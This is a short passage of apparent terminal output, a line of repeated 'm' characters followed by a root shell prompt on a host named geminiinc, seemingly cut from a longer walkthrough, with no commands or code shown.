mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
root@geminiinc:~#
```